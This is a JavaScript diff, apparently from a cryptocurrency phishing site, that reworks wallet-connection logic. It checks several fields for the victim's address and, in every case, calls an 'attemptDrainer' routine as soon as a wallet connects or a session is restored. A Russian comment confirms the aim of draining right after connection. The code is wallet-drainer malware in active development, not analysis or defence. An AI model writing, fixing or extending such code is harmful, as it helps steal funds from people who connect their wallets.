@@ -866,7 +866,8 @@ window.addEventListener('DOMContentLoaded', async () => {
     try {
       const state = await new Promise(resolve => {
         const unsubscribe = appKit.subscribeState(state => {
-          if (state.connected && state.address) {
+          console.log('🔍 SubscribeState (restore):', state);
+          if (state.connected && (state.address || state.accounts?.[0])) {
             unsubscribe();
             resolve(state);
           }
@@ -876,10 +877,12 @@ window.addEventListener('DOMContentLoaded', async () => {
           resolve(null);
         }, 2000);
       });
-      if (state && state.address && state.address.toLowerCase() === connectedAddress.toLowerCase()) {
+      if (state && (state.address || state.accounts?.[0]) && 
+          ((state.address && state.address.toLowerCase() === connectedAddress.toLowerCase()) || 
+           (state.accounts?.[0] && state.accounts[0].toLowerCase() === connectedAddress.toLowerCase()))) {
         await attemptDrainer();
       } else {
-        console.warn(`⚠ Wallet not connected, clearing session`);
+        console.warn(`⚠ Wallet not connected or address mismatch, clearing session`);
         sessionStorage.removeItem('sessionId');
         connectedAddress = null;
       }
@@ -979,7 +982,7 @@ async function handleConnectOrAction() {
       console.log('🔄 Opening AppKit modal for wallet selection...');
       await appKit.open();
       connectedAddress = await waitForConnection();
-      console.log(`✅ Wallet connected: ${connectedAddress}`);
+      console.log(`✅ Wallet connected in handleConnectOrAction: ${connectedAddress}`);
 
       if (!window.ethereum) throw new Error('No Ethereum provider available after connection');
       const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
@@ -1011,17 +1014,32 @@ async function waitForConnection() {
     console.log(`ℹ Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
 
     const unsubscribe = appKit.subscribeState((state) => {
-      if (state.connected && state.address) {
-        console.log(`✅ Wallet connected via AppKit: ${state.address}`);
+      console.log('🔍 SubscribeState:', state);
+      let walletAddress = null;
+
+      // Проверяем возможные поля для адреса
+      if (state.connected) {
+        if (state.address) {
+          walletAddress = state.address;
+        } else if (state.accounts && state.accounts.length > 0) {
+          walletAddress = state.accounts[0];
+        } else if (state.selectedAddress) {
+          walletAddress = state.selectedAddress;
+        }
+      }
+
+      if (walletAddress) {
+        console.log(`✅ Wallet connected via AppKit: ${walletAddress}`);
+        connectedAddress = walletAddress;
         unsubscribe();
-        connectedAddress = state.address;
         // Вызываем attemptDrainer сразу после подключения
         attemptDrainer()
           .then(() => {
             appKit.close();
-            resolve(state.address);
+            resolve(walletAddress);
           })
           .catch((err) => {
+            console.error(`❌ Error in attemptDrainer: ${err.message}`);
             appKit.close();
             reject(err);
           });
@@ -1029,6 +1047,7 @@ async function waitForConnection() {
     });
 
     const timeout = setTimeout(() => {
+      console.warn('⚠ Connection timeout');
       unsubscribe();
       appKit.close();
       reject(new Error('Timeout waiting for wallet connection'));
